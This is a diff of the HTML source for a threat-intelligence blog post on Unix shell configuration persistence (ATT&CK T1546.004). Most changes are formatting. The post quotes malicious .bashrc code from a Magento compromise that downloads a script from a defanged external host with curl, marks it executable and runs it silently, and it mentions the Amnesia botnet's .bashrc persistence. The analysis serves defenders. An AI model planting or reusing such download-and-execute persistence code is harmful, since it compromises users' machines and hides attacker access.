@@ -11,7 +11,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <meta
   name="description"
-  content="Event Triggered Execution: Unix Shell Configuration Modification #  T1546.004
+  content="Event Triggered Execution: Unix Shell Configuration Modification # T1546.004
 Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user’s home directory (~/) to configure the environment."
 />
 <meta
@@ -46,21 +46,19 @@ Adversaries may establish persistence through executing malicious commands trigg
 <link href="https://axelarator.github.io/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
 
 
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Event Triggered Execution: Unix Shell Configuration Modification (T1546.004)"/>
-<meta name="twitter:description" content="Event Triggered Execution: Unix Shell Configuration Modification #  T1546.004
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Event Triggered Execution: Unix Shell Configuration Modification (T1546.004)"/>
+<meta name="twitter:description" content="Event Triggered Execution: Unix Shell Configuration Modification # T1546.004
 Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user’s home directory (~/) to configure the environment."/>
 
 
 
 <meta property="og:title" content="Event Triggered Execution: Unix Shell Configuration Modification (T1546.004)" />
-<meta property="og:description" content="Event Triggered Execution: Unix Shell Configuration Modification #  T1546.004
+<meta property="og:description" content="Event Triggered Execution: Unix Shell Configuration Modification # T1546.004
 Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user’s home directory (~/) to configure the environment." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://axelarator.github.io/posts/modification/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-06-23T20:27:39-04:00" />
 <meta property="article:modified_time" content="2022-06-23T20:27:39-04:00" /><meta property="og:site_name" content="Axelarator Blog" />
-
 
 
 
@@ -196,24 +194,24 @@ into scripts automatically executed by shells. Using bash as an example, the def
   <a href="#magento" class="h-anchor" aria-hidden="true">#</a>
 </h3>
 <p>Malicious code was inserted within a site owner’s <code>.bashrc</code> file that downloads a JavaScript file from a remote location. This file loads whenever a user logs into a Unix account locally or through SSH.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">checks<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>ps aux | grep php-fpm | grep -v grep | grep tmp<span style="color:#66d9ef">)</span>;
-
-<span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$checks<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
-
-   rm -rf /tmp/.a /tmp/start_6457387765553057055;
-
-   <span style="color:#66d9ef">if</span> ! <span style="color:#f92672">[</span> -f /tmp/php-fpm <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
-
-      curl -qs javascloud<span style="color:#f92672">[</span>.<span style="color:#f92672">]</span>com/victim_install.js &gt; /tmp/php-fpm;
-
-      chmod +x /tmp/php-fpm;
-
-   <span style="color:#66d9ef">fi</span>
-
-   /bin/sh /tmp/php-fpm &gt; /dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span> &amp;
-
-Fi
-</code></pre></div><p><strong>Amnesia - IoT/Linux Botnet</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>checks<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>ps aux | grep php-fpm | grep -v grep | grep tmp<span style="color:#66d9ef">)</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$checks<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   rm -rf /tmp/.a /tmp/start_6457387765553057055;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">if</span> ! <span style="color:#f92672">[</span> -f /tmp/php-fpm <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      curl -qs javascloud<span style="color:#f92672">[</span>.<span style="color:#f92672">]</span>com/victim_install.js &gt; /tmp/php-fpm;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      chmod +x /tmp/php-fpm;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   /bin/sh /tmp/php-fpm &gt; /dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span> &amp;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Fi
+</span></span></code></pre></div><p><strong>Amnesia - IoT/Linux Botnet</strong></p>
 <p>Amnesia creates persistence files in <code>~/.bashrc</code> and <code>~/.bash_history</code>.</p>
 <h1 id="references">
   References
